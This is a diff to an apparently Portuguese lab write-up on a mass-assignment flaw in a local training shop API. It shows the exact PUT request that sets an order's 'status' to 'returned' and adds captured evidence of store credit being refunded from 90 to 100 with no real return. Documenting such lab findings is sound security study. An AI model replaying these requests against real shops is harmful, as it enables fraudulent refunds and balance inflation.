@@ -25,7 +25,7 @@ Host: localhost:8888
 Authorization: Bearer <token>
 ```
 
-2. Descubra o endpoint "sombra" que edita um pedido específico (estrutura REST previsível — ex.: `PUT`/`POST` sobre `/workshop/api/shop/orders/{order_id}`). Envie no corpo uma propriedade de controle que o cliente não deveria poder definir, como `status`:
+2. Edite o pedido pelo endpoint "sombra" `PUT /workshop/api/shop/orders/{order_id}`, enviando no corpo a propriedade de controle `status` — que o cliente não deveria poder definir:
 
 ```http
 PUT /workshop/api/shop/orders/{order_id} HTTP/1.1
@@ -33,16 +33,23 @@ Host: localhost:8888
 Authorization: Bearer <token>
 Content-Type: application/json
 
-{ "status": "returned", "quantity": 1 }
+{ "status": "returned" }
 ```
 
-3. Se o saldo/crédito for devolvido sem qualquer validação de devolução física, o mass assignment está confirmado. Repetir para inflar o saldo (Challenge 9).
-
-> **Confirmar na instância:** o nome exato do campo de status e o método/caminho do endpoint de edição devem ser validados observando o tráfego do fluxo legítimo de "return order".
+3. O crédito é devolvido sem qualquer validação de devolução física. Repetir para inflar o saldo (Challenge 9).
 
 ## 4. Evidência
 
-> _A preencher após execução._ Print salvo em `evidencias/04-mass-assignment/`. Mostrar o saldo/crédito **antes** e **depois** da requisição, provando o reembolso indevido, e o corpo da requisição com o campo injetado.
+**Confirmado contra a instância local** — captura em [`evidencias/04-mass-assignment/captura.txt`](../../evidencias/04-mass-assignment/captura.txt).
+
+```
+crédito antes:  100.0
+POST /workshop/api/shop/orders  {"product_id":1,"quantity":1}  -> compra (crédito 90.0, order id 7)
+PUT  /workshop/api/shop/orders/7  {"status":"returned"}        -> HTTP 200, status do pedido = "returned"
+crédito depois: 100.0
+```
+
+O crédito voltou de **90 para 100** sem nenhuma devolução real: o item ficou de graça. O servidor aceitou que o cliente gravasse diretamente o campo `status`.
 
 ## 5. Por que é um risco
 
